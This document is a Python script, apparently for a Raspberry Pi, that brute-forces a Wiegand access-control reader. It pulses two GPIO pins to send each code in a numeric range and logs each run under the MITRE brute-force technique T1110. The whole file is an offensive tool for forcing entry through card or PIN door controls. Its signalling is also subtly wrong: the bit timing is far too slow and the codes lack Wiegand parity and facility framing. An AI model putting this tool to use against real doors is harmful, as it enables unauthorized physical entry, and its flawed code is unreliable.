#!/usr/bin/env python3

import time
import argparse
import json
import os
from datetime import datetime

LOG_FILE = "results/wiegand_bruteforce_log.json"
MITRE_TTP = "T1110"

def log(entry):
    os.makedirs("results", exist_ok=True)
    try:
        with open(LOG_FILE, "r") as f:
            data = json.load(f)
    except:
        data = []
    data.append(entry)
    with open(LOG_FILE, "w") as f:
        json.dump(data, f, indent=2)

def bruteforce_wiegand(pin_d0, pin_d1, code_start=1000, code_end=1100, delay=0.2):
    try:
        import RPi.GPIO as GPIO
        GPIO.setmode(GPIO.BCM)
        GPIO.setup(pin_d0, GPIO.OUT)
        GPIO.setup(pin_d1, GPIO.OUT)

        for code in range(code_start, code_end + 1):
            bin_code = bin(code)[2:].zfill(26)
            for bit in bin_code:
                if bit == '0':
                    GPIO.output(pin_d0, GPIO.LOW)
                    time.sleep(delay)
                    GPIO.output(pin_d0, GPIO.HIGH)
                else:
                    GPIO.output(pin_d1, GPIO.LOW)
                    time.sleep(delay)
                    GPIO.output(pin_d1, GPIO.HIGH)
                time.sleep(delay)
            time.sleep(1)
        GPIO.cleanup()
        return True
    except Exception as e:
        return False

def main():
    parser = argparse.ArgumentParser(description="Wiegand Brute-force Entry Generator")
    parser.add_argument("--d0", type=int, required=True, help="GPIO pin for D0 line")
    parser.add_argument("--d1", type=int, required=True, help="GPIO pin for D1 line")
    parser.add_argument("--start", type=int, default=1000)
    parser.add_argument("--end", type=int, default=1100)
    args = parser.parse_args()

    success = bruteforce_wiegand(args.d0, args.d1, args.start, args.end)
    log({
        "timestamp": datetime.utcnow().isoformat(),
        "d0": args.d0,
        "d1": args.d1,
        "range": f"{args.start}-{args.end}",
        "success": success,
        "ttp": MITRE_TTP
    })

if __name__ == "__main__":
    main()
